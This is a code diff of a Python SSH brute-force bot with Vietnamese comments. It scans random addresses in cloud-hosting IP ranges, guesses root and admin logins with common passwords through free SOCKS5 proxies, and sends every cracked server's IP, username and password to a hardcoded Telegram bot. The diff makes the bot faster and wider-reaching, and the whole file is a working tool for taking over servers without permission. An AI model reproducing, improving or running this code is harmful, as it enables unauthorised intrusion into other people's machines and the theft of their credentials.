@@ -10,10 +10,10 @@ import threading
 TELE_TOKEN = "8770472029:AAF0Abw9Xc8U0ZPkkiF-Erb1aRNbzqoHDCY"
 TELE_CHAT_ID = "6706357035"
 
-# Danh sách dải IP mục tiêu (DigitalOcean, Vultr, v.v.)
-IP_RANGES = ["128.199", "159.203", "167.71", "45.32", "139.59"]
+# Dải IP mục tiêu (DigitalOcean, Vultr, v.v.)
+IP_RANGES = ["128.199", "159.203", "167.71", "45.32", "139.59", "104.248"]
 USERS = ["root", "admin"]
-PASSWORDS = ["123456", "root", "admin123", "password", "12345"]
+PASSWORDS = ["123456", "root", "admin123", "password", "12345", "12345678"]
 
 def send_tele(message):
     url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
@@ -21,20 +21,15 @@ def send_tele(message):
     except: pass
 
 def get_free_proxies():
-    """Tự động lấy danh sách Socks5 miễn phí"""
-    print("[*] Đang tìm kiếm Proxy Socks5 sạch...")
+    """Lấy danh sách Socks5 miễn phí"""
     url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all"
     try:
         res = requests.get(url, timeout=10)
-        proxies = [p for p in res.text.strip().split('\r\n') if ":" in p]
-        print(f"[+] Đã hốt được {len(proxies)} Proxy Socks5!")
-        return proxies
-    except:
-        return []
+        return [p for p in res.text.strip().split('\r\n') if ":" in p]
+    except: return []
 
 def scan_vps(target_ip, proxy_list):
     if not proxy_list: return
-    
     proxy = random.choice(proxy_list)
     p_ip, p_port = proxy.split(":")
     
@@ -42,47 +37,42 @@ def scan_vps(target_ip, proxy_list):
         for password in PASSWORDS:
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            
             try:
-                # Cấu hình Proxy Socks5 cho socket
+                # Cấu hình Proxy Socks5
                 proxy_sock = socks.socksocket()
                 proxy_sock.set_proxy(socks.SOCKS5, p_ip, int(p_port))
-                proxy_sock.settimeout(4)
+                proxy_sock.settimeout(3)
                 proxy_sock.connect((target_ip, 22))
                 
-                # Thử kết nối SSH
-                ssh.connect(target_ip, username=user, password=password, sock=proxy_sock, timeout=5)
+                # Thử SSH
+                ssh.connect(target_ip, username=user, password=password, sock=proxy_sock, timeout=4)
                 
-                # NẾU THÀNH CÔNG
+                # THÀNH CÔNG
                 result = f"🚀 VPS HÍT ĐƯỢC!\nIP: {target_ip}\nUser: {user}\nPass: {password}\nProxy: {proxy}"
                 print(result)
                 send_tele(result)
                 ssh.close()
                 return
-            except Exception:
-                continue
+            except: continue
 
 def main():
-    send_tele("🎯 BOT SCAN VPS (AUTO PROXY) KHỞI CHẠY!")
-    
+    send_tele("🎯 BOT SCAN VPS QUA PROXY ĐÃ LÊN ĐÈN!")
     while True:
-        # 1. Làm mới danh sách Proxy
         proxies = get_free_proxies()
         if not proxies:
-            time.sleep(60)
-            continue
+            time.sleep(30); continue
             
-        # 2. Quét ngẫu nhiên các IP
-        for _ in range(50): # Quét 50 IP mỗi đợt lấy proxy
+        threads = []
+        for _ in range(20): # Chạy 20 luồng cùng lúc
             base = random.choice(IP_RANGES)
             target_ip = f"{base}.{random.randint(1, 254)}.{random.randint(1, 254)}"
-            
-            # Chạy luồng (Thread) để quét nhanh hơn
             t = threading.Thread(target=scan_vps, args=(target_ip, proxies))
             t.start()
-            time.sleep(0.5) # Tránh treo máy Railway
-
-        time.sleep(30) # Nghỉ một lát rồi lấy list proxy mới
+            threads.append(t)
+            time.sleep(0.2)
+            
+        for t in threads: t.join() # Đợi các luồng xong rồi mới lấy proxy mới
+        time.sleep(5)
 
 if __name__ == "__main__":
     main()
